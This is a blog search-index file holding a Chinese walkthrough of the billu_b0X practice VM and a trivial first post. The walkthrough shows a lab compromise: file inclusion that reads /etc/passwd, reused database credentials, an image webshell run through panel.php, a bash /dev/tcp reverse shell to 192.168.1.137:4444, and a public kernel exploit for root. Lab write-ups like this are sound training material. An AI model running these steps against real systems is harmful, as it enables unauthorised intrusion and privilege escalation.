<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>靶机练习-1：billu_b0X</title>
    <link href="/2021/04/27/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0-1%EF%BC%9Abillu-b0X/"/>
    <url>/2021/04/27/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0-1%EF%BC%9Abillu-b0X/</url>
    
    <content type="html"><![CDATA[<h2 id="靶机练习-1：billu-b0X"><a href="#靶机练习-1：billu-b0X" class="headerlink" title="靶机练习-1：billu_b0X"></a>靶机练习-1：billu_b0X</h2><h4 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h4><p>Billu_b0x，VMware虚拟机设置为nat模式，靶机自动获取ip地址</p><p>kali linux 2020虚拟机，ip地址192.168.1.137</p><h4 id="渗透步骤："><a href="#渗透步骤：" class="headerlink" title="渗透步骤："></a>渗透步骤：</h4><h5 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h5><h6 id="1-ip发现"><a href="#1-ip发现" class="headerlink" title="1.ip发现"></a>1.ip发现</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>使用nmap扫描本网段主机，其中192.168.1.1为网卡地址，192.168.1.3为网关，137为本机地址，</p><p>目标靶机ip为192.168.1.132</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_box%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0.png" alt="image-20201231224509510"></p><p>或者使用命令arp-scan -l扫描，效果相同，且不扫描本机</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231224634344.png" alt="image-20201231224634344"></p><h6 id="2-端口及服务扫描"><a href="#2-端口及服务扫描" class="headerlink" title="2.端口及服务扫描"></a>2.端口及服务扫描</h6><p>使用nmap进行端口和服务扫描，指定1-65535全端口，并添加参数A做服务识别和深度扫描，生成结果文件a.txt</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p<span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -A <span class="hljs-number">192.168.1.132</span> -<span class="hljs-literal">oN</span> a.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_b0X%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.png" alt="image-20201231224915291"></p><p>从上图中可以看到，靶机是一台ubuntu，开启http服务，访问上去看一下</p><p>show me your sqli skills:让展示一下注入技巧，sqlmap测试未果，再看看其他的目录</p><p>[<img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_b0x%E4%B8%BB%E9%A1%B5.png" alt="DKKlKx.png">]</p><h6 id="3-目录及页面扫描"><a href="#3-目录及页面扫描" class="headerlink" title="3.目录及页面扫描"></a>3.目录及页面扫描</h6><p>用kali的dirb跑一下目录</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/billu_b0x%20dirb%E6%89%AB%E6%8F%8F.png" alt="image-20201231225713412">+</p><p>同时windows用御剑跑一下，可以得到更多的爆破结果</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231230127563.png" alt="image-20201231230127563"></p><p>得到页面较多，test.php、add.php、in.php、c.php、index.php、show.php等，目录有：uploaded_images，phpmy，依次访问</p><h5 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h5><h6 id="1-访问test-php：页面提示file参数为空，需要提供file参数"><a href="#1-访问test-php：页面提示file参数为空，需要提供file参数" class="headerlink" title="1.访问test.php：页面提示file参数为空，需要提供file参数"></a>1.访问test.php：页面提示file参数为空，需要提供file参数</h6><p>测试一下文件下载，不行，会跳转回首页</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231230819189.png" alt="image-20201231230819189"></p><h6 id="2-在Firefox的Hackbar中，将get请求，变更为post请求，文件下载"><a href="#2-在Firefox的Hackbar中，将get请求，变更为post请求，文件下载" class="headerlink" title="2.在Firefox的Hackbar中，将get请求，变更为post请求，文件下载"></a>2.在Firefox的Hackbar中，将get请求，变更为post请求，文件下载</h6><p>成功，获得passwd文件，这里用burp改包也行，但是要麻烦一些，就直接hackbar了。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231231532879.png" alt="image-20201231231532879"></p><h6 id="3-通过同样文件包含的方法，下载add-php、in-php、c-php、index-php、show-php、panel-php等文件，后面可以访问文件的同时，审计文件的源代码。"><a href="#3-通过同样文件包含的方法，下载add-php、in-php、c-php、index-php、show-php、panel-php等文件，后面可以访问文件的同时，审计文件的源代码。" class="headerlink" title="3.通过同样文件包含的方法，下载add.php、in.php、c.php、index.php、show.php、panel.php等文件，后面可以访问文件的同时，审计文件的源代码。"></a>3.通过同样文件包含的方法，下载add.php、in.php、c.php、index.php、show.php、panel.php等文件，后面可以访问文件的同时，审计文件的源代码。</h6><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231231649579.png" alt="image-20201231231649579"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232504441.png" alt="image-20201231232504441"></p><ol start="4"><li><h6 id="查看passwd文件，发现1个id-1000的账号ica，ssh连接的用户名可以是ica或root"><a href="#查看passwd文件，发现1个id-1000的账号ica，ssh连接的用户名可以是ica或root" class="headerlink" title="查看passwd文件，发现1个id 1000的账号ica，ssh连接的用户名可以是ica或root"></a>查看passwd文件，发现1个id 1000的账号ica，ssh连接的用户名可以是ica或root</h6></li></ol><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232027735.png" alt="image-20201231232027735"></p><p>访问add.php、in.php页面和审计代码</p><p>add.php是一个上传界面，但是功能无法使用，查看源码文件发现只是个页面，没有后台处理代码。in.php是php info信息</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232247255.png" alt="image-20201231232247255"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232539359.png" alt="image-20201231232539359"></p><h6 id="5-查看c-php源码"><a href="#5-查看c-php源码" class="headerlink" title="5.查看c.php源码"></a>5.查看c.php源码</h6><p>这是个数据库连接文件，人家直接写了mysql连接用户名密码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232908417.png" alt="image-20201231232908417"></p><h6 id="6-通过dirb暴破出-phpmy目录，访问该目录到phpmyadmin登录页面"><a href="#6-通过dirb暴破出-phpmy目录，访问该目录到phpmyadmin登录页面" class="headerlink" title="6.通过dirb暴破出/phpmy目录，访问该目录到phpmyadmin登录页面"></a>6.通过dirb暴破出/phpmy目录，访问该目录到phpmyadmin登录页面</h6><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231233502816.png" alt="image-20201231233502816"></p><p>用刚刚在c.php看到的用户名：billu，密码：b0x_billu登录，登录成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231233707322.png" alt="image-20201231233707322"></p><p>在ica_lab数据库的auth表中，找到web登录的用户名：biLLu，密码：hEx_it</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231233638955.png" alt="image-20201231233638955"></p><h6 id="7-回index-php，登进去"><a href="#7-回index-php，登进去" class="headerlink" title="7.回index.php，登进去"></a>7.回index.php，登进去</h6><p>进来以后看到一个账号管理界面，里面已经有了两个账户，杰克船长和巴博萨船长</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231234202943.png" alt="image-20201231234202943"></p><p>两个账号的头像图片地址，在之前已经暴破出来：uploaded_images，登上去，下载一张图片jack.jpg出来，里面有些乱七八糟的东西，是我第一遍做的时候传上去的，不管它们，不影响接着做</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231234443183.png" alt="image-20201231234443183"></p><h6 id="7-点击add-user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。"><a href="#7-点击add-user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。" class="headerlink" title="7.点击add user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。"></a>7.点击add user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。</h6><p>查看之前test文件包含获得的panel.php源码，发现panel.php存在本地文件包含漏洞：</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101103835037.png" alt="image-20210101103835037"></p><p>用文本编辑器打开刚刚下载下来的图片，在文件末尾加一条命令，生成图片马</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101104540102.png" alt="image-20210101104540102"></p><p>把这张图片上传上去</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101111249263.png" alt="image-20210101111249263"></p><p>测试一下图片马能否正常使用，点击continue，用burp抓包，使用burp执行命令：</p><p>post请求url中加入执行命令的参数：POST /panel.php?cmd=cat%20/etc/passwd;ls</p><p>post的body中包含cmd.jpg图片马：load=/uploaded_images/3.jpg&amp;continue=continue</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101111519306.png" alt="image-20210101111519306"></p><p>可以看到测试没有问题，命令成功被执行</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101111627588.png" alt="image-20210101111627588"></p><h6 id="8-制作一个反弹shell，命令：echo-“bash-i-gt-amp-dev-tcp-192-168-1-137-4444-0-gt-amp-1″-bash"><a href="#8-制作一个反弹shell，命令：echo-“bash-i-gt-amp-dev-tcp-192-168-1-137-4444-0-gt-amp-1″-bash" class="headerlink" title="8.制作一个反弹shell，命令：echo “bash -i &gt;&amp; /dev/tcp/192.168.1.137/4444 0&gt;&amp;1″ | bash"></a>8.制作一个反弹shell，命令：echo “bash -i &gt;&amp; /dev/tcp/192.168.1.137/4444 0&gt;&amp;1″ | bash</h6><p>需要先将命令url编码：</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101120048156.png" alt="image-20210101120048156"></p><p>在post的url中加入编码好的命令</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101125246031.png" alt="image-20210101125246031"></p><p>在发送前，先在命令行nc监听，以便接受反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101113430892.png" alt="image-20210101113430892"></p><p>点击发送，接收成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101125854351.png" alt="image-20210101125854351"></p><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><h6 id="1-提权准备工作"><a href="#1-提权准备工作" class="headerlink" title="1.提权准备工作"></a>1.提权准备工作</h6><p>这里需要找一个有写权限的目录，先前我们上传图片的那个目录/uploaded_images，很显然就有写权限，不然也没法往里面上传图片，我们在这个目录下写一个菜刀马，一会方便用菜刀连接传输文件</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101130935950.png" alt="image-20210101130935950"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101130908414.png" alt="image-20210101130908414"></p><p>菜刀连接一下，如图连接成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101131453390.png" alt="image-20210101131453390"></p><h6 id="2-提升权限"><a href="#2-提升权限" class="headerlink" title="2.提升权限"></a>2.提升权限</h6><p>查看系统内核，命令uanme -a和cat /etc/issue</p><p>可以看到详细的系统信息</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132344836.png" alt="image-20210101132344836"></p><p>这里可以使用一个著名的ubuntu本地提权exp，<a href="https://www.exploit-db.com/exploits/37292%EF%BC%8C%E8%BF%99%E4%B8%AA%E9%93%BE%E6%8E%A5%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5">https://www.exploit-db.com/exploits/37292，这个链接可以下载下来</a></p><p>下载后把这个文件用菜刀放到/uploaded_images目录下</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132746285.png" alt="image-20210101132746285"></p><p>然后赋予这个文件权限</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132913066.png" alt="image-20210101132913066"></p><p>编译exp</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132958470.png" alt="image-20210101132958470"></p><p>然后运行即可提权</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101133102180.png" alt="image-20210101133102180"></p><p>查看是否生效，如图，提权成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101135446041.png" alt="image-20210101135446041"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在爆破完目录后注意要尽量利用test.php下载所有可下载的页面源码，以提高发现漏洞的可能；在登录phpmyadmin和拿到普通用户密码登录index.php时，要注意区分大小写；在上传图片马成功准备制作反弹shell时，尽量不要耽搁时间，页面会话时间较短，很容易会话过期，在利用图片马时，发送至repeater模块的请求是带有cookie的，若页面会话过期注意重新登录后更换请求，不然带着过期的cookie进行请求会一直接收不到反弹shell（被这个折磨了很久，一开始一直找不到原因）</p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>my-first-blog</title>
    <link href="/2021/04/27/my-first-blog/"/>
    <url>/2021/04/27/my-first-blog/</url>
    
    <content type="html"><![CDATA[<p>你好</p><p><a href="https://imgtu.com/i/gCFQXQ"><img src="https://z3.ax1x.com/2021/04/27/gCFQXQ.jpg" alt="gCFQXQ.jpg"></a></p>]]></content>
    
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
